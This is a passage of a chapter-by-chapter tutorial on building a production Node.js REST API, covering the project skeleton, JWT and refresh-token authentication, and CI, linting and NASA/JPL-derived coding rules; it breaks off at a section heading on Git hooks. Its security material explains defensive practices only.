# Learning Guide: Building a Production REST API

This file grows with the project. Each chapter explains one step: **what** was built,
**why** it was designed that way, the **concepts** behind it, and **exercises** so you
can rebuild it yourself without looking.

| Chapter | Step                                                                | Status |
| ------- | ------------------------------------------------------------------- | ------ |
| 1       | Project skeleton, Postgres, health checks, tests, Docker, CI        | ✅     |
| 2       | Authentication: register, login, refresh tokens, logout             | ✅     |
| 3       | Professional quality: CI/CD, security scanning, NASA/JPL code rules | ✅     |
| 4       | Workspaces, members, invitations and role-based permissions         | ✅     |
| 5       | Projects and tasks: pagination, filtering, sorting                  | ✅     |
| 6       | Error format, logging, OpenAPI docs                                 | ⏳     |
| 7       | Seed data and a recruiter-ready README                              | ⏳     |

---

## Chapter 1: The skeleton

### What we built

A tiny API that does almost nothing yet, but is wired the way real production services are:

```
GET /health/live   -> 200 {"status":"ok"}
GET /health/ready  -> 200 {"status":"ok","database":"up"}   (or 503 if the DB is down)
```

Plus everything around it: typed config, a database connection, structured logs,
automated tests, a Docker image and a CI pipeline that runs on every pull request.

It may feel strange to spend a whole step on an app with two endpoints. That's the point:
in a real job, the skeleton is where most "production" quality comes from. Every later
feature inherits it for free.

### The folder layout

```
src/
  config/env.ts        # reads and validates settings
  plugins/prisma.ts    # database connection, shared with the whole app
  routes/health.ts     # the two health endpoints
  app.ts               # buildApp(): assembles plugins and routes
  server.ts            # starts listening, handles shutdown
  generated/prisma/    # code Prisma writes for us (not committed)
prisma/schema.prisma   # database tables (none yet)
test/health.test.ts    # automated tests
Dockerfile, docker-compose.yml, .github/workflows/ci.yml
```

**Why split it like this?** Each file has one job. When something breaks you know where to
look, and when you add a feature you add files instead of growing one giant file.

### Concept 1: Why Fastify (and not Express)?

Express is the classic choice, and you'll see it everywhere. Fastify does the same job but:

- **Schemas built in.** You describe a route's input and output, and Fastify validates
  requests and serializes responses from that description. Faster and safer.
- **Plugins with scope.** Features are packaged as plugins with clear boundaries
  (see Concept 4).
- **Async-first.** Route handlers just `return` a value or `throw` an error.
- **Built-in structured logging** with pino.

Knowing both is good. Fastify shows you understand the "why" behind modern backends.

### Concept 2: Validate configuration at startup ("fail fast")

`src/config/env.ts` uses **Zod** to describe every environment variable the app needs:

```ts
const EnvSchema = z.object({
  PORT: z.coerce.number().int().positive().default(3000),
  DATABASE_URL: z.url({ protocol: /^postgres(ql)?$/ }),
  ...
});
```

If `DATABASE_URL` is missing, the app refuses to start and prints exactly what's wrong.
Without this, the app would start "fine" and crash on the first request that touches the
database, maybe hours later, maybe only in production.

Bonus: `z.infer<typeof EnvSchema>` gives us a TypeScript type for free, so
`env.PORT` is known to be a `number` everywhere.

> **Rule of thumb:** anything coming from outside your code (env vars, HTTP requests,
> files) is untrusted until validated.

### Concept 3: Prisma and connection pools

**Prisma** is an ORM: you describe tables in `prisma/schema.prisma`, and it generates a
fully typed client (`prisma.user.findMany(...)`) so the TypeScript compiler catches typos
in column names.

Opening a database connection is slow (network handshake, authentication). So we create
**one** `PrismaClient` for the whole app; under the hood it keeps a **pool** of open
connections and reuses them across requests. Creating a client per request is a classic
beginner bug that exhausts the database's connection limit under load.

Prisma 7 talks to Postgres through a **driver adapter** (`@prisma/adapter-pg`, built on the
standard `pg` driver), which is why you see `new PrismaClient({ adapter })`.

### Concept 4: Fastify plugins and decorators

`src/plugins/prisma.ts` is a plugin. It:

1. creates the client,
2. `app.decorate('prisma', prisma)` attaches it so any route can use `app.prisma`,
3. `app.addHook('onClose', ...)` disconnects when the app shuts down.

By default Fastify plugins are **encapsulated**: what they add is only visible inside them.
Wrapping with `fastify-plugin` (`fp`) "breaks" encapsulation on purpose so the whole app
sees `app.prisma`. The `declare module 'fastify'` block tells TypeScript that the property
exists.

### Concept 5: Liveness vs readiness

Two different questions:

- **Liveness** (`/health/live`): "Is the process alive?" If this fails, restart it.
  It must never check the DB, otherwise a database blip would restart every API instance.
- **Readiness** (`/health/ready`): "Can it serve traffic right now?" It runs `SELECT 1`.
  If this fails, the load balancer stops sending traffic here until it recovers, and
  returns **503 Service Unavailable**.

Kubernetes, AWS ECS and Docker all use this pattern.

### Concept 6: Structured logs and request IDs

Fastify logs JSON lines, not free text:

```json
{
  "level": 30,
  "reqId": "6566…",
  "req": { "method": "GET", "url": "/health/ready" },
  "msg": "incoming request"
}
```

Machines (Grafana Loki, Datadog, CloudWatch) can search and filter JSON. Every request gets
a UUID (`genReqId`), and we send it back in an `x-request-id` header. When a user reports a
bug, they give you that id, and you find every log line for that exact request.

In development we pipe logs through `pino-pretty` so they're readable for humans.

### Concept 7: Separate "build" from "listen" (testability)

`app.ts` exports `buildApp()`, which assembles the app but **doesn't** open a port.
`server.ts` is the only file that calls `listen()`.

This lets tests do:

```ts
const app = await buildApp(loadEnv());
const res = await app.inject({ method: 'GET', url: '/health/live' });
expect(res.statusCode).toBe(200);
```

`app.inject()` simulates an HTTP request in memory: no port, no network, very fast, and
it goes through the exact same routing, validation and hooks as a real request.

### Concept 8: A real database in tests

Tests run against a **real Postgres** (`api_test`), not a mock. Mocks can lie: a query
that works against a mock can fail on real Postgres. A separate test database means
tests can freely create and delete data without touching your dev data.
`vitest.config.ts` loads `.env.test` to point tests at it.

### Concept 9: Graceful shutdown

When you deploy a new version, the platform sends the old process `SIGTERM`. We catch it
and call `app.close()`, which stops accepting new connections, lets in-flight requests
finish, runs `onClose` hooks (closing the DB pool), and then exits. Without this, users
get random errors during every deploy.

### Concept 10: Multi-stage Docker builds

The `Dockerfile` has two stages:

1. **build**: installs everything (TypeScript, Prisma CLI), compiles to `dist/`.
2. **runtime**: copies only `dist/` and production dependencies.

The final image is smaller (faster deploys) and has fewer tools an attacker could use.
It also runs as the unprivileged `node` user, never as root.

### Concept 11: Continuous Integration

`.github/workflows/ci.yml` runs on every push and pull request:

1. starts a throwaway Postgres as a **service container**,
2. `npm ci` (clean, reproducible install from `package-lock.json`),
3. type-check, test, build,
4. builds the Docker image to prove it still builds.

A green check on every PR is one of the first things a reviewer (or recruiter browsing
your GitHub) looks at.

### Build it yourself

Try recreating this chapter from an empty folder, peeking only when stuck:

1. `npm init -y`, set `"type": "module"`, install `fastify zod` and dev deps `typescript tsx vitest @types/node`.
2. Write `env.ts` with a Zod schema for `PORT` only. Make the app crash with a nice message when `PORT=abc`.
3. Write `buildApp()` with a single `GET /health/live` route, and `server.ts` that listens.
4. Write one Vitest test using `app.inject()`.
5. Add Prisma: `npm i @prisma/client @prisma/adapter-pg pg`, `npm i -D prisma`, create `schema.prisma`, run `npx prisma generate`.
6. Add the Prisma plugin and the `/health/ready` route.
7. Add the `x-request-id` header and a test for it.
8. Write the Dockerfile and the CI workflow.

### Exercises

1. **Break it on purpose.** Stop Postgres and call `/health/ready`. What status and log
   line do you get? Does `/health/live` still return 200? Why does that matter?
2. **Add a version endpoint.** `GET /version` returning `{ "version": "1.0.0" }` read
   from `package.json`, with a response schema and a test.
3. **Config challenge.** Add a `CORS_ORIGIN` env var that must be a URL in production but
   is optional in development. (Hint: Zod's `.superRefine` or `.refine`.)
4. **Think about it.** Why does the readiness check use `SELECT 1` instead of querying a
   real table?

### Words to know

REST · endpoint · status code (200, 404, 503) · environment variable · ORM ·
connection pool · plugin · decorator · liveness/readiness probe · structured logging ·
request id · integration test · graceful shutdown · SIGTERM · multi-stage build · CI

---

## Chapter 2: Authentication

### What we built

```
POST /auth/register  {email, password, name}  -> 201 {user, accessToken, refreshToken}
POST /auth/login     {email, password}        -> 200 {user, accessToken, refreshToken}
POST /auth/refresh   {refreshToken}           -> 200 {accessToken, refreshToken}   (new pair)
POST /auth/logout    {refreshToken}           -> 204
GET  /users/me       Authorization: Bearer …  -> 200 {id, email, name, createdAt}
```

Plus: a `users` and `refresh_tokens` table (our first migration), one consistent error
format, input validation with Zod, rate limiting on login, and 18 new tests.

### New files

```
prisma/migrations/…_auth/migration.sql  # the SQL Prisma generated for our tables
src/lib/errors.ts                       # AppError: status + stable code + message
src/plugins/error-handler.ts            # turns every error into the same JSON shape
src/plugins/auth.ts                     # JWT setup + app.authenticate guard
src/modules/auth/auth.schemas.ts        # Zod schemas for requests and responses
src/modules/auth/auth.service.ts        # the business logic (hashing, tokens, rotation)
src/modules/auth/auth.routes.ts         # thin HTTP layer that calls the service
src/modules/users/users.routes.ts       # GET /users/me
test/global-setup.ts, test/helpers.ts   # migrate test DB, reset tables, shared helpers
test/auth.test.ts                       # 18 tests
```

**Why "modules"?** As the API grows, grouping by feature (`auth/`, `users/`, later
`workspaces/`, `tasks/`) scales better than grouping by type (`all-routes/`,
`all-services/`). Everything about auth lives in one folder.

**Why routes + service?** Routes deal with HTTP (status codes, headers). The service deals
with rules (how to hash, when a token is valid). Keeping them apart means you could call
`AuthService` from a CLI script or a background job without faking HTTP.

### Concept 1: Migrations

You never edit a production database by hand. Instead:

1. change `prisma/schema.prisma` (we added `User` and `RefreshToken`),
2. run `npm run db:migrate -- --name auth`,
3. Prisma compares the schema with the DB and writes a SQL file in `prisma/migrations/`.

That SQL file is committed. Every environment (your laptop, CI, production) runs the
same files in the same order (`prisma migrate deploy`), so they all end up identical.
Open `migration.sql` and read it: it's plain SQL, and you should always review it.

Notice `@map("password_hash")` and `@@map("users")`: TypeScript uses `camelCase`, SQL
conventionally uses `snake_case` table and column names. Mapping gives you both.

### Concept 2: Never store passwords, store slow hashes

A hash is a one-way function: easy to compute from the password, practically impossible
to reverse. At login we hash what the user typed and compare.

But regular hashes (SHA-256) are _fast_, and a GPU can try billions per second against a
leaked database. **argon2id** is designed to be slow and use lots of memory, which kills
that attack. It also adds a random **salt** per user, so two people with the same password
get different hashes. The salt is stored inside the hash string (`$argon2id$v=19$m=…`).

Also notice the password has a **max** length (128). It's a sanity bound, like the maximum on
every other string (chapter 3, rule 3), but it isn't what protects the CPU: argon2 first
condenses the password with a fast hash, then does its slow work on that fixed-size result, so
a 10 KB password costs about the same as an 8-character one. Every hash still costs real CPU,
which is why the authentication endpoints are rate limited (Concept 9).

### Concept 3: Don't leak which emails exist

Login returns the exact same `401 INVALID_CREDENTIALS` for "no such email" and "wrong
password". If the messages differed, attackers could build a list of real accounts.

Subtler: if unknown emails returned instantly but real ones took 100 ms (argon2 is slow),
the _timing_ would leak the same thing. So for unknown emails we still run
`argon2.verify` against a dummy hash. Look for `dummyHash` in `auth.service.ts`.

One endpoint still tells: registering an email that already exists answers
`409 EMAIL_TAKEN`. Most sign-up forms accept that trade-off. Avoiding it needs email
verification: always answer "check your inbox", then email either a welcome link or "you
already have an account". Meanwhile, the rate limit makes testing emails one by one slow.

### Concept 4: Access tokens (JWT)

After login the client gets an **access token**, a JWT, and sends it on every request:
`Authorization: Bearer eyJhbGci…`.

A JWT is three base64 parts: `header.payload.signature`. The payload is just
`{"sub":"<user id>","iat":…,"exp":…}`. **It is readable by anyone** (paste one into
jwt.io), so never put secrets in it. What makes it trustworthy is the **signature**:
an HMAC of header + payload using `JWT_ACCESS_SECRET`. Change one character of the payload
and the signature no longer matches (the "rejects a tampered token" test proves it).

Why JWTs? The server can verify them with no database lookup, which is fast and scales.
The downside: you can't "cancel" one before it expires. So we keep them **short-lived
(15 minutes)**.

We also pin the algorithm (`algorithms: ['HS256']`). Some old JWT libraries trusted the
`alg` field in the token itself, letting attackers pick `none`. Pinning prevents that.

### Concept 5: Refresh tokens and rotation

15-minute logins would be annoying, so login also returns a **refresh token**: a long
random string (32 bytes) valid for 30 days, used only to get new access tokens.

- It's **random, not a JWT**, and stored in the DB, so we _can_ revoke it.
- We store only its **SHA-256 hash**. If the database leaks, the tokens can't be used.
  (Fast SHA-256 is fine here, unlike passwords: the token is 256 random bits, there's
  nothing to guess.)
- **Rotation:** each `/auth/refresh` revokes the old refresh token and issues a new one.
- **Reuse detection:** all tokens from one login share a `familyId`. If a _revoked_ token
  is presented again, either the user or a thief is using a stale copy. We can't tell
  which, so we revoke the whole family and both must log in again. This is the approach
  recommended by the OAuth 2.0 security best practices.
- **Race safety:** we revoke with `updateMany({ where: { id, revokedAt: null } })` and check
  that it changed 1 row. If two requests refresh the same token at the same instant, only
  one wins.

> **Where should clients keep tokens?** For browser apps, an `HttpOnly`, `Secure`,
> `SameSite` cookie is safest for the refresh token because JavaScript can't read it.
> We return tokens in JSON because it keeps this API usable from mobile apps, scripts and
> tests. Moving the refresh token to a cookie is Exercise 4.

### Concept 6: Validation with Zod + type providers

`fastify-type-provider-zod` lets routes use Zod schemas directly:

```ts
app.post('/register', { schema: { body: RegisterBody, response: { 201: AuthResponse } } }, …)
```

That one line gives us three things:

1. **Validation:** bad input is rejected with 400 before our handler runs.
2. **Types:** `request.body` is automatically typed as `{ email: string; … }`.
3. **Safe output:** the response is serialized through `AuthResponse`, so fields not in
   the schema (like `passwordHash`) are dropped. Defense in depth: even if we accidentally
   return the whole DB row, the hash never leaves the server.

Schemas can also _transform_: `Email` trims and lowercases, so `" Alice@X.com "` and
`"alice@x.com"` are the same account.

### Concept 7: One error format

Every error now looks like:

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Request validation failed",
    "details": [{ "path": "/email", "message": "Invalid email address" }]
  }
}
```

- `code` is stable and machine-readable. Frontends switch on it.
- `message` is for humans and can change.
- Unknown errors become a generic 500. The full error goes to the logs, never to the client
  (stack traces and SQL help attackers).

We also tell the logger to **redact** the `Authorization` header so tokens never end up in
log files.

### Concept 8: Uniqueness belongs to the database

To reject duplicate emails we _don't_ do "check if exists, then insert". Two signups at the
same moment could both pass the check. Instead the DB has a `UNIQUE` index on `email`, we
just insert, and turn Prisma's `P2002` error into `409 EMAIL_TAKEN`. Let the database
enforce invariants; it's the only component that sees every write.

### Concept 9: Rate limiting

`@fastify/rate-limit` allows `AUTH_RATE_LIMIT_MAX` (default 10) login/register/refresh
attempts per IP per minute, then returns `429 RATE_LIMITED`. That turns "try a million
passwords" into "try 10 a minute". It's off globally (`global: false`) and enabled per
route via `config.rateLimit`.

### Concept 10: Testing auth properly

Tests now run against migrated tables, and `resetDb()` truncates them before each test so
tests can't affect each other. `fileParallelism: false` stops two test files from fighting
over the same database.

Look at _what_ we test: not just the happy path, but the attacks. Tampered token, expired
token, reused refresh token, duplicate email in different case, timing-safe error messages,
brute force. Security code is mostly about the unhappy paths.

### Build it yourself

1. Add the `User` model, run a migration, read the generated SQL.
2. Write `POST /auth/register` that hashes with argon2 and returns the user (no tokens yet).
   Write a test proving the hash isn't the password.
3. Add `@fastify/jwt`, return an access token, and add `GET /users/me` guarded by
   `app.authenticate`. Test with and without the token.
4. Add `POST /auth/login` with the dummy-hash trick.
5. Add the `RefreshToken` model, then `/auth/refresh` with rotation. Write the reuse test
   _first_, watch it fail, then implement family revocation.
6. Add the error handler and rate limiting.

### Exercises

1. **Read a JWT.** Register with curl, copy the `accessToken`, and decode the middle part:
   `echo '<payload>' | base64 -d`. What fields do you see? Why is it fine that it's readable?
2. **Change password.** Add `POST /users/me/password` taking `currentPassword` and
   `newPassword`. It should verify the current one, update the hash, and revoke **all** the
   user's refresh tokens. Write tests.
3. **Logout everywhere.** Add `POST /auth/logout-all` (authenticated) that revokes every
   refresh token for the user.
4. **Cookies.** Make `/auth/login` also set the refresh token as an
   `HttpOnly; Secure; SameSite=Strict` cookie using `@fastify/cookie`, and let
   `/auth/refresh` read it from there.
5. **Think about it.** Why do we hash refresh tokens with SHA-256 but passwords with
   argon2? What would go wrong if we swapped them?

### Words to know

migration · hash · salt · argon2id · JWT · signature · HMAC · claims (`sub`, `exp`) ·
access token · refresh token · token rotation · reuse detection · user enumeration ·
timing attack · rate limiting · 401 vs 403 vs 409 vs 429 · idempotent · defense in depth

---

## Chapter 3: Professional quality: CI/CD, security scanning and NASA/JPL code rules

### What we built

No new endpoints this time. Instead, the project got the machinery real teams use to keep a
codebase healthy as it grows, and every new rule was applied to the code from chapters 1
and 2:

- **Coding rules from NASA's Jet Propulsion Laboratory**, the "Power of Ten", adapted to
  TypeScript and enforced automatically, including an ESLint rule we wrote ourselves.
- **The strictest TypeScript settings**, **Prettier** for formatting, and **Git hooks** that
  check your work before it leaves your machine.
- **A CI pipeline** that runs on every pull request: formatting, lint, types, tests with a
  coverage threshold, commit messages, a dependency audit, a Docker build with a smoke test
  and a vulnerability scan, CodeQL code scanning and dependency review.
- **Automated maintenance and releases (CD):** Dependabot opens update pull requests every
  week, and pushing a version tag publishes Docker images and a GitHub release.
- **The documents every serious repository has:** README badges, CONTRIBUTING, SECURITY,
  CODE_OF_CONDUCT, CHANGELOG, issue and pull request templates, CODEOWNERS.

The new rules, and a review of the code with them in mind, found real problems in the code we
had already written. Fixing them was part of this step:

| Problem found                                                                               | Fix                                                                       |
| ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| A crash between "create the user" and "create their first session" left a user half-created | Both writes happen in one transaction                                     |
| A crash between "revoke the old refresh token" and "issue the new one" logged the user out  | Rotation is one transaction, and an `invariant()` checks its result       |
| A request could take forever, and a busy DB pool made requests wait forever                 | Request, connection and statement timeouts, all in `src/config/limits.ts` |
| Request bodies could be 1 MB (Fastify's default) though our largest is under 1 KB           | A 64 KB body limit                                                        |
| `Email` trimmed and lowercased the raw string before checking its length                    | `z.string().max(320)` bounds it before any processing                     |
| The shutdown handler could hang forever, and an error in it was never handled               | `shutdown()` handles its own errors, and exits anyway after 10 seconds    |
| A module-level `let` held the dummy password hash                                           | It's a private field of `AuthService`                                     |
| Checks like `if (!user \|\| !ok)` relied on "truthiness"                                    | Explicit comparisons: `if (user === null \|\| !passwordMatches)`          |
| A logout that arrived while a refresh was rotating the token missed the new token           | Rotation and revocation lock the user's row first: they run one at a time |
| Prisma's own transaction limits (2 s to start, 5 s in total) applied without anyone knowing | Declared in `src/config/limits.ts` and passed to Prisma                   |

The test suite grew from 24 to 60 tests. Line coverage is about 98%, and CI fails if it drops
below the thresholds in `vitest.config.ts`.

### New files

```
.github/
  workflows/ci.yml             # every PR: format, lint, types, tests, commits, audit, Docker
  workflows/pr-title.yml       # the PR title follows Conventional Commits (rechecked on edit)
  workflows/codeql.yml         # security static analysis of the code and the workflows
  workflows/dependency-review.yml  # blocks vulnerable dependencies and unexpected licenses
  workflows/scorecard.yml      # OpenSSF Scorecard: grades our security practices weekly
  workflows/release.yml        # tag v1.2.3 -> images on GHCR + GitHub release
  dependabot.yml               # weekly update PRs for npm, actions and the Docker image
  CODEOWNERS, pull_request_template.md, ISSUE_TEMPLATE/
.husky/                        # Git hooks: pre-commit, commit-msg, pre-push
eslint.config.js               # lint rules, labeled by Power of Ten rule
eslint-rules/no-recursion.js   # our own lint rule (Power of Ten rule 1)
.prettierrc.json, .editorconfig, .gitattributes, .nvmrc
commitlint.config.js           # Conventional Commits
tsconfig.build.json            # compiles only src/ for production
scripts/changelog-section.mjs  # release notes from CHANGELOG.md
scripts/coverage-summary.mjs   # coverage table on the CI run page
src/config/limits.ts           # every resource limit, in one place (rule 3)
src/lib/invariant.ts           # assertions (rule 5)
src/lib/locks.ts               # row locks, so some transactions run one at a time
src/lib/db.ts, src/lib/tokens.ts
test/input-bounds.test.ts      # proves every input string and array has a maximum size
test/no-recursion-rule.test.ts # tests for our lint rule
test/errors.test.ts, test/invariant.test.ts, test/scripts.test.ts
CONTRIBUTING.md, SECURITY.md, CODE_OF_CONDUCT.md, CHANGELOG.md
```

### Concept 1: Quality gates, and catching problems early

A **quality gate** is an automatic check that must pass before code moves forward. We have
four layers, from fastest to slowest:

| Layer       | When it runs        | What it checks                                           | Time    |
| ----------- | ------------------- | -------------------------------------------------------- | ------- |
| Your editor | As you type         | Types and lint errors, underlined in red                 | Instant |
| Git hooks   | `commit` and `push` | Lint and format the changed files, commit message, types | Seconds |
| CI          | Every pull request  | Everything, from a clean machine, including security     | Minutes |
| Code review | Before merging      | Design, naming, logic: what machines can't judge         | Hours   |

A bug costs more the later it's found: a red underline costs nothing, a failed CI run a few
minutes, a bug in production an incident. That's why teams "shift left": move every check
as early as possible. And anything a machine can check, a machine should check, so human
reviewers can spend their attention on the design.

### Concept 2: Formatter, linter, type checker: three different jobs

- **Prettier** decides how code _looks_: quotes, commas, line breaks. It has almost no
  options on purpose, so there's nothing to argue about in reviews.
- **ESLint** finds code that is legal but risky: a promise nobody awaits, a variable that
  shadows another, a function too complex to read. With **typescript-eslint** in
  `strictTypeChecked` mode, rules can use type information: for example, it knows that
  `app.close()` returns a promise, so forgetting `await` is an error.
- **The TypeScript compiler** proves that types line up. `strict: true` is only the start.
  `tsconfig.json` switches on every extra check:

| Option                                 | What it catches                                                                                     |
| -------------------------------------- | --------------------------------------------------------------------------------------------------- |
| `noUncheckedIndexedAccess`             | `rows[0]` has type `Row \| undefined`: the array might be empty, so you must check                  |
| `exactOptionalPropertyTypes`           | `{ name?: string }` means "absent or a string", and `name: undefined` is not allowed                |
| `noPropertyAccessFromIndexSignature`   | `process.env.PORT` must be written `process.env['PORT']`: a reminder that it may be missing         |
| `noImplicitReturns`                    | A function that returns a value on some paths but falls off the end on another                      |
| `noUnusedLocals`, `noUnusedParameters` | Dead code, often a sign of a bug                                                                    |
| `verbatimModuleSyntax`                 | `import type` for types, so the compiled JavaScript never imports something that doesn't exist      |
| `allowJs` + `checkJs`                  | The JavaScript files (configs, scripts, our lint rule) are type-checked too, through JSDoc comments |

### Concept 3: NASA/JPL's "Power of Ten" rules

In 2006, Gerard Holzmann of NASA's Jet Propulsion Laboratory (JPL) published
["The Power of Ten: Rules for Developing Safety-Critical Code"](https://spinroot.com/gerard/pdf/P10.pdf).
JPL writes the software that flies spacecraft, where a crash can't be fixed by restarting a
server. Holzmann's insight was that long coding standards get ignored, so he picked just ten
rules, each one checkable by a tool. JPL later built them into its institutional coding
standard, used on missions like the Curiosity Mars rover.

The rules were written for C. A web API isn't a spacecraft, but it wants the same things:
code simple enough to analyze, resources that can't run out, and failures that are loud and
safe instead of silent. So we kept each rule's _intent_ and translated it:

| #   | Original rule (for C)                                               | Our TypeScript version                                                                        | Enforced by                                               |
| --- | ------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| 1   | Simple control flow: no `goto`, no recursion                        | No recursion, no labels; complexity at most 10, nesting at most 3 levels                      | Our `no-recursion` rule, `complexity`, `max-depth`        |
| 2   | Every loop has a fixed upper bound                                  | No `while`, `do...while`, `for...in` or `for await`; `for` loops over finite arrays           | `no-restricted-syntax`                                    |
| 3   | No dynamic memory allocation after initialization                   | Every resource has a fixed limit: body size, string lengths, pool size, timeouts              | `limits.ts`, Zod schemas, `input-bounds.test.ts`          |
| 4   | Functions fit on one printed page (about 60 lines)                  | At most 60 lines per function and 400 per file                                                | `max-lines-per-function`, `max-lines`                     |
| 5   | At least two assertions per function, on average                    | Validate all input at the boundary; assert internal invariants with `invariant()`             | Zod, `src/lib/invariant.ts`, code review                  |
| 6   | Declare data at the smallest possible scope                         | `const` by default, no module-level mutable state, no shadowing                               | `prefer-const`, `no-shadow`, `no-restricted-syntax`       |
| 7   | Check every return value and every parameter                        | No forgotten promises, no truthiness checks on non-booleans, exhaustive `switch`              | `no-floating-promises`, `strict-boolean-expressions`      |
| 8   | Limit the preprocessor to simple macros                             | No `eval`, `any`, `as unknown as T`, `!` or `@ts-ignore`; every `eslint-disable` explains why | typescript-eslint, `eslint-comments`                      |
| 9   | Restrict pointers: one level of dereferencing, no function pointers | No reassigning parameters, at most 4 parameters, at most 3 nested callbacks                   | `no-param-reassign`, `max-params`, `max-nested-callbacks` |
| 10  | All warnings on from day one, zero warnings, daily static analysis  | Strictest compiler settings, every lint rule is an error, CodeQL on every PR and weekly       | `tsconfig.json`, `--max-warnings 0`, CodeQL               |

Open `eslint.config.js`: every rule is labeled with the Power of Ten rule it enforces. Some
rules don't need a lint rule (3 and 5): they are enforced by code, tests and review.

#### Rule 1: why ban recursion, and how we wrote our own lint rule

With recursion, how deep the call stack goes depends on the _input_. A recursive function
that walks a JSON document works fine in tests, then crashes with "Maximum call stack size
exceeded" when an attacker sends a document nested 100,000 levels deep. A loop with a limit
can't do that.

ESLint has no rule against recursion, so we wrote one: `eslint-rules/no-recursion.js`. ESLint
parses each file into an **AST** (abstract syntax tree: the code as a tree of nodes like
`FunctionDeclaration` and `CallExpression`) and calls our rule's handlers as it walks the
tree. Our rule keeps a stack of the functions it is currently inside. When it sees a call, it
checks whether the called name is one of those functions:

```js
FunctionDeclaration: enter,          // push { name: 'walk' } on the stack
'FunctionDeclaration:exit': exit,    // pop it
CallExpression(node) {
  const called = describeCall(node); // walk(...) or this.walk(...)
  if (stack.some((frame) => frame.name === called.name && frame.isMember === called.isMember)) {
    context.report({ node, messageId: 'recursion', data: { name: called.name } });
  }
},
```

`test/no-recursion-rule.test.ts` tests it with ESLint's `RuleTester`: code that must pass and
code that must be reported. Its limitation is written in the file: it can't see _indirect_
recursion (`a` calls `b`, `b` calls `a`). That needs a call graph of the whole program (see
the exercises).

What do you write instead? An explicit stack and a hard limit. `test/input-bounds.test.ts`
walks a JSON Schema tree this way:

```ts
const stack = [{ node: root, path: '' }];
for (let i = 0; i < MAX_NODES; i++) {
  const current = stack.pop();
  if (current === undefined) return problems; // walked everything
  // ...check current.node, push its children...
}
throw new Error(`schema has more than ${String(MAX_NODES)} nodes`);
```

The loop has a fixed upper bound (rule 2), and if the limit is ever reached, it fails loudly
instead of running forever.

#### Rule 2: loops with a fixed upper bound

`while (condition)` runs until something changes, and nothing in the syntax proves that it
will. So `while`, `do...while` and `for await...of` (which can wait forever on a stream) are
banned, and so is `for...in`, which also visits inherited properties. What's left: `for`
loops with a counter and a limit, and `for...of` or `.map()` over arrays. Arrays are finite,
and rule 3 keeps them small.

The rule even reaches the CI scripts: the Docker smoke test waits for the API with
`for attempt in $(seq 1 30)`, not with "until it answers".

#### Rule 3: bounded resources

C programs on spacecraft allocate all their memory at startup, so they can never run out
mid-flight. A Node.js server can't do that, but it can make sure that **no input is unbounded
and nothing waits without a limit**. All the limits live in `src/config/limits.ts`:

| Limit                     | Value | Default without it                                           |
| ------------------------- | ----- | ------------------------------------------------------------ |
| Request body              | 64 KB | 1 MB                                                         |
| Time to receive a request | 30 s  | No limit: a slow client could hold a connection open forever |
| Database connections      | 10    | 10, now explicit and configurable with `DATABASE_POOL_MAX`   |
| Wait for a DB connection  | 5 s   | Wait forever when the pool is busy                           |
| One SQL statement         | 10 s  | No limit: one slow query could hold a connection forever     |
| Start a transaction       | 5 s   | 2 s, Prisma's default: easy to miss                          |
| One whole transaction     | 10 s  | 5 s, Prisma's default: easy to miss                          |
| Graceful shutdown         | 10 s  | Wait forever for open requests                               |

And every string a client can send has a maximum length, every array a maximum size. A
reviewer could miss a missing `.max()`, so a test checks it for us: `test/input-bounds.test.ts`
converts every input schema to JSON Schema and fails if any string or array is unbounded.
When you add an endpoint, the test checks its schemas automatically.

What still grows is **history**. Every login and every refresh stores a refresh token row, and
nothing deletes the old ones yet. Requests stay fast (every lookup uses an index and every
list is capped), but a table that only grows needs housekeeping. A production deployment runs
a scheduled job that deletes tokens that expired a while ago, a fixed number of rows at a time
(rule 2 again). Writing it is one of the exercises below.

#### Rule 5: assertions

There are two kinds of "this should never happen":

1. **Bad input from outside.** That's expected, and handled at the boundary: Zod rejects it
   with a `400` before our code runs.
2. **A bug in our own code.** That's what assertions are for. `invariant(condition, message)`
   throws if the condition is false:

```ts
const live = await tx.refreshToken.count({ where: { familyId, revokedAt: null } });
invariant(live === 1, `session must have exactly 1 live refresh token, found ${String(live)}`);
```

Because this runs inside the transaction, a failed invariant rolls back the whole refresh,
so the bug can't leave bad data in the database. The client gets a generic 500 and the log
gets the full message. The signature `asserts condition` also tells TypeScript that after the
call, the condition is true, just like an `if` would.

#### Rule 7: check every return value

The most common bug in async JavaScript is a forgotten `await`: the promise runs on its own,
its error is never caught, and the next line runs too early. `no-floating-promises` makes
every promise either awaited, returned, or explicitly discarded with `void`, which shows the
reader it's deliberate.

`strict-boolean-expressions` bans "truthiness" checks on anything that isn't a boolean. Why?
`if (count)` is false for `0`, and `if (name)` is false for `""`. Both are classic bugs. You
write what you mean: `if (user === null)`, `if (count > 0)`.

#### Rule 10: zero warnings

A warning nobody acts on is noise, and noise hides the warning that matters. So every rule in
`eslint.config.js` is an error, CI runs ESLint with `--max-warnings 0`, and an
`eslint-disable` comment that no longer disables anything is itself an error. If a rule must
be broken, you disable it for one line and explain why:

```ts
// eslint-disable-next-line <rule-name> -- <why this is safe here>
```

Tests follow the same safety rules, with the size rules relaxed: a `describe()` block is
naturally longer than 60 lines.

### Concept 4: Tests and coverage

**Coverage** measures which lines and branches of `src/` ran during the tests. We're at about
98% of lines, and `vitest.config.ts` makes CI fail below 90% of lines and 85% of branches.

Coverage tells you what is _not_ tested, but a high number doesn't prove much: a test that
calls a function without checking the result raises coverage and catches nothing. So the new
tests check behavior: a 500 hides the internal error message, a 100 KB body gets `413`,
malformed JSON gets `400`, two simultaneous refreshes with the same token give exactly one
`200` and one `401` and revoke the session. 100% is not the goal: the last few percent are
usually code that's hard to reach, and chasing them produces tests that check nothing.

**Race tests need extra care.** Two requests started together with `Promise.all` only overlap
if both can reach the database at the same moment. With a single open connection, the second
request waits while a new connection is set up, so the two run one after the other, and the
test passes even without the protection it's supposed to check. Our first race tests had
exactly that flaw: a review removed the fixes and the tests still passed. `warmUpPool()` in
`test/helpers.ts` now opens a few connections first, and every race test was checked both
ways: it passes with the fix and fails without it.

That review also found a real race. A logout that arrived while a refresh was rotating the
token revoked the old token but missed the new one, which didn't exist yet when the logout's
`UPDATE` started, so the session lived on. Now both start with `lockUser()` from
`src/lib/locks.ts` (`SELECT ... FOR UPDATE` on the user's row), so the second one waits for
the first and then sees its result. A test fires the logout at different moments of a refresh
and checks that no live token is left.

### Concept 5: Git hooks and Conventional Commits

